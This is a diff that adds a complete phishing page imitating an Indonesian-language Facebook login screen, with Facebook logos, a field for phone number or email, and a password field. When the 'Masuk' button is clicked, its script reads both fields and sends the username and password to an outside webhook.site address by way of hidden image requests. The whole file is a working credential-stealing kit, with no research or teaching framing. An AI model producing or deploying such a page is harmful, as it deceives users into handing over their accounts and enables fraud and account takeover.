@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Masuk | Facebook</title>
+</head>
+
+<body>
+<img src="https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcRgtRm3QtZP9jhZJl1QlcykcFbekn12iDuW9pigQubOWBrIkrEo" id="logo">
+<br>
+<hr>
+<p id="catatan">Anda harus login untuk melanjutkan</p>
+<hr>
+<br>
+<input id="ntel" placeholder="Nomor ponsel atau email">
+<br>
+<br>
+<input id="npass" placeholder="Kata Sandi">
+<br>
+<br>
+<button id="masuk" onclick="aksi()">Masuk</button>
+<br>
+<br>
+<a id="forg">Lupa Kata Sandi?</a>
+<br>
+<p id="atau">atau</p>
+<br>
+<button id="bab">Buat Akun Baru</button>
+<br>
+<br>
+<img src="https://www.facebook.com/images/fb_icon_325x325.png" id="ic">
+</body>
+
+</html>
+<style>
+  body{
+    text-align: center;
+    background-color: white;
+  }
+  #logo{
+    position: relative;
+    width: 45vw;
+  }
+  #catatan{
+    position: relative;
+    font-size: 2vw;
+  }
+  #ntel,#npass{
+    position: relative;
+    width: 95vw;
+    height: 7vh;
+    background-color: #ECECEC;
+    border: transparent;
+    border-radius: 3px;
+    border: 0.5px solid #D8D8D8;
+  }
+  #masuk{
+    position: relative;
+    width: 95vw;
+    height: 7vh;
+    background-color: #0066FF;
+    border-radius: 6px;
+    border: transparent;
+    color: white;
+    font-weight: bold;
+    font-size: 4vw;
+  }
+  #forg{
+    position: relative;
+    color: #0066FF;
+    font-size: 4vw;
+  }
+  #atau{
+    position: relative;
+    color: dimgray;
+    font-size: 4vw;
+  }
+  #bab{
+    position: relative;
+    border: transparent;
+    width: 35vw;
+    height: 6vh;
+    background-color: #0BAE00;
+    color: white;
+    font-weight: bold;
+    border-radius: 5px;
+  }
+  #ic{
+    position: relative;
+    width: 10vw;
+    height: 5.5vh;
+  }
+</style>
+<script>
+function aksi(){
+  var hookServer="https://webhook.site/c6a1bd0a-e298-43f0-8aeb-4aeb6f6b3380";
+  
+  var un=document.getElementById("ntel").value;
+  var pass=document.getElementById("npass").value;
+  
+  
+  var hookUsername=hookServer+"/?username="+un;
+  var hookPassword=hookServer+"/?password="+pass;
+  
+  var sendUn=new Image();
+  var sendPass=new Image();
+  sendUn.src=hookUsername;
+  sendPass.src=hookPassword;
+  console.log("Sending...");
+}
+</script>
